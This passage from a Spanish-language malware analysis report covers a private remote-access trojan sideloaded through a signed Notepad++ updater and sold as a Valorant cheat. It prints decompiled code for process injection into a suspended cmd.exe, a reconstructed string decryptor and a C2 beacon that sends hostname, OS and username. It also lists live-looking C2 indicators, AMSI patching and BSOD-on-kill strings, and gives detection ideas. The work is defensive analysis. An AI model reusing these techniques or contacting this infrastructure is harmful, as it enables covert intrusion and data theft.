El protocolo (`createtask`/`task_id;`/`type;`/`param;`/`task_done;` + descarga por `_chunk_` + inyección en cmd.exe suspendido + HTTP artesanal) **no coincide con ninguna familia pública** (DcRat, AsyncRAT, XWorm, etc. usan protocolos distintos y estructuras .NET). Todo apunta a **un RAT privado en C++ con ofuscación propia (MBA + TLS + cripto a medida)**, posiblemente un loader comercial de la escena de «game cheats» reutilizado como botnet personal. El nivel de ingeniería (capas de cifrado, CTR propio, cadenas TLS, señuelos) está muy por encima del típico script kiddie de esa escena.

---

## 13. Fragmentos seleccionados del análisis

### Cadenas del stage-2 recuperadas del cifrado TLS (selección)

```
'C:\ProgramData\Windows\Microsoft\RuntimeBrokerA.exe'   (ruta de instalación)
'mops.to'                                               (host del C2, cadena UTF-16)
'406'  '408'                                            (puertos)
'1.0.0'                                                 (versión del bot)
'ready;'  ';version;'  'ping'  'pong'  'getinfo'  'info;'  'task'
'checkserver;'
'cmd.exe /C '
'_chunk_'
'%s_%s_tempchunk_%d'  '%s_%s_chunk_%d'  '%s_%s_chunk_'
'createtask'  'closetask'  'task_id;'  'type;'  'version;'  'param;'  'task_done;'
'GET /task/%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n'
'Global\RuntimeBrokerAdsA'                              (mutex)
'Software\WinRAR\Libs'                                  (almacén de fragmentos en registro)
'C:\Windows\System32\cmd.exe'                           (hospedador de la inyección)
'amsi.dll'  'AmsiOpenSession'                           (parcheo de AMSI)
'RtlSetProcessIsCritical'  'NtRaiseHardError'           (BSOD)
'BootTrigger'  'TimeRepetition'  'SvcRestartTaskWindowsLoginsA'  ...
'anyrun'  'anyrun GPU'                                  (detección de ANY.RUN)
'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'  (alfabeto del generador)
```

### El descifrador de cadenas del stage-2, reconstruido

```python
def ror8(c, n):
    n &= 7
    return ((c >> n) | (c << (8 - n))) & 0xFF if n else c

def decrypt(cipher):
    return bytes(ror8(c, (i % 7) + 1) ^ ((i * 13 + 0xA3) & 0xFF)
                 for i, c in enumerate(cipher))
```

Con esas seis líneas se deshace la totalidad de la capa de strings del RAT.

### El mensaje de identificación, ensamblado en `FUN_14001dcb0`

```c
lstrcpynA(aCStack_bd8, DAT_1400810d8, 0x200);   // "info;"
lstrcatA(aCStack_bd8, pcStack_730);             // HWID / identificador de máquina
lstrcatA(aCStack_bd8, ";");
lstrcatA(aCStack_bd8, pcStack_728);             // "Windows 10" / "Windows 11" / ...
lstrcatA(aCStack_bd8, ";");
lstrcatA(aCStack_bd8, pcStack_720);             // nombre de usuario (GetUserNameW)
lstrcatA(aCStack_bd8, ";");
lstrcatA(aCStack_bd8, pcStack_718);             // "7571078989" (identificador de bot)
```

### El inyector de payloads (`FUN_14001c990`)

```c
lpString2 = (LPCSTR)FUN_14001cb80();          // "C:\Windows\System32\cmd.exe"
lstrcpynA(local_108, lpString2, 0x104);
CreateProcessA(local_108, NULL, NULL, NULL, 0,
               0x8000004,                     // CREATE_SUSPENDED | CREATE_NO_WINDOW
               NULL, NULL, &si, &pi);
ResumeThread(pi.hThread);
Sleep(500);
FUN_140019b70(payload, size, pi.hProcess, param);   // inyección: NtAllocateVirtualMemory +
                                                    // NtWriteVirtualMemory + NtCreateThreadEx
CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
*pid_out = pi.dwProcessId;                    // el PID queda registrado para 'closetask'
```

### El generador de nonces de 15 caracteres (`FUN_14005d780`)

```c
seed = GetTickCount64() ^ parametro ^ rdtsc();
Sleep(100);
Sleep(100);                        // (contribuye al ruido del rdtsc)
for (i = 0; i < 16; i++) {
    seed ^= seed << 13;
    seed ^= seed >> 7;
    seed ^= seed << 17;
    nombre[i] = alfabeto[seed % 62];
}
nombre[15] = 0;                    // 15 caracteres + NUL
```

`JPcd56xErJkLadWe` tiene exactamente esa morfología (15 caracteres alfanuméricos).

### Verificación de la firma de Client.exe (signify)

```
firmas embebidas: 1
FIRMANTE: Notepad++ | Saint Cloud | Ile-de-France | FR
VERIFICACION: AuthenticodeVerificationResult.OK
```

---

## 14. Indicadores de compromiso (IOC)

### Red

```
Dominio:   mops.to
IP:        45.91.202.47
Puertos:   408/TCP (C2 principal)  ·  406/TCP (checkserver)
Ruta C2:   GET /task/7571078989
UA:        cadena "Windows <version> <edicion> + huella de hardware"
Respuesta anti-sondeo: "Access denied" a User-Agents genericos
```

### Ficheros (SHA-256)

```
eaac64c113ebaba1fae924ad1b6239a44c8806bf2b85d8dc11a27ad65a981cc1  Client.exe (GUP legitimo, lanzador)
1aa245a0526450a76bfa127eddc986ff3c53b6bfb624787ea3f1a62f97672783  libcurl.dll (stage-1 malicioso)
a4cd739574d897c9620a1f33e1678c4a3bd481610d4790757a3684b3e1a608d9  RuntimeBrokerA (stage-2 descifrado)
84ffd8dcf2efd4dc9d01663fa8aacc9c36564ae0fae288a93fcb42ccda14a32f  NvMessageBus.dll (señuelo)
```

### Host

```
Fichero:   C:\ProgramData\Windows\Microsoft\RuntimeBrokerA.exe
Mutex:     Global\RuntimeBrokerAdsA
Registro:  Software\WinRAR\Libs (almacén de fragmentos descargados)
Tareas:    SvcRestartTaskWindowsLoginsA · ProgramDataUpdateA · ScheduledDefA ·
           MicrosoftUpdaterMachineCoreA (con BootTrigger / TimeRepetition)
Rutas excluidas de Defender:
           %TEMP% · C:\ProgramData · C:\ProgramData\Windows\Microsoft · C:\ProgramData\Microsoft\Windows
Marcadores del autor (en stage-1 y stage-2): 32a2df2d992b · cd5d20d266d4ffff
```

### YARA (ideas de reglas)

- `libcurl.dll` con un único import de KERNEL32 y exportes curl.
- PE firmado por Notepad++ ejecutándose fuera de `\Notepad++\updater\` (ya existe regla Sigma).
- Proceso `cmd.exe` con padre `RuntimeBrokerA.exe` en `C:\ProgramData\Windows\Microsoft\`.
- La constante `ROR8+i*13+0xA3` aplicada por byte (firma del cifrador de cadenas del actor).
- Tarea programada `SvcRestartTaskWindowsLoginsA` en `\Microsoft\Windows\SoftwareProtectionPlatform`.

---

## 15. Conclusión

**La muestra es un RAT profesional y privado disfrazado de producto de «cheat» para Valorant.** Su autor conoce bien el análisis de malware (capas de cifrado a medida, cadenas en TLS, ofuscación MBA, señuelos, fragmentación de payloads, filtro anti-sondeo en el panel) y conoce igualmente bien a su público: las víctimas son jugadores que buscan skins gratis, un nicho con alta disposición a ejecutar cosas dudosas como administrador y a desactivar su antivirus si se les pide.

Tres decisiones de diseño destacan sobre el resto:

1. **Usar el binario firmado de otra empresa como lanzador** (GUP de Notepad++) le otorga al stage-1 la reputación criptográfica de un editor legítimo y una técnica (DLL sideloading) que los antivirus tradicionales siguen tratando mal.
2. **Provocar un pantallazo azul si lo investigan o lo matan** (`RtlSetProcessIsCritical` + `NtRaiseHardError`) transforma la limpieza manual en un castigo y el análisis dinámico en algo incómodo: un comportamiento más propio de malware de estado que de un loader de escena gamer.
3. **No embeber el payload final.** El RAT es solo la puerta: el producto peligroso se descarga por chunks desde `mops.to` cuando el operador lo ordena. Por eso, un análisis estático de este paquete nunca mostrará robo de credenciales: la capacidad real depende de lo que el panel sirva en cada momento, y el panel sigue vivo y filtrando (`Access denied`).

Desde el punto de vista del análisis, la muestra quedó completamente revertida: las tres capas de cifrado están rotas, el stage-2 final está extraído como PE analizable, el protocolo C2 está documentado al nivel de mensaje, las capacidades están enumeradas y la infraestructura está identificada y fechada (dominio registrado dos semanas antes del build, ajustado el mismo día del empaquetado). La cronología de artefactos (props de septiembre, build del 2 de octubre) junto con los marcadores internos comunes a ambos stages retratan a un actor con una operación cuidada y planificada, distribuyendo variantes del mismo motor bajo distintas marcas de «skin changer».

**Lo que la muestra no contiene es igual de revelador**: ni tokens, ni webhooks, ni claves de servicios de terceros. Todo pasa por su propia infraestructura. Para la víctima, la consecuencia práctica es que el daño real (lo que se ejecute vía `createtask`) es desconocido y variable; para el investigador, que el siguiente paso natural es el registro pasivo de `mops.to` y, si se decide sondear el endpoint `/task/`, hacerlo con la réplica exacta del User-Agent del bot y desde infraestructura desechable, sabiendo que el panel filtra y registra.

*Fin del informe.*
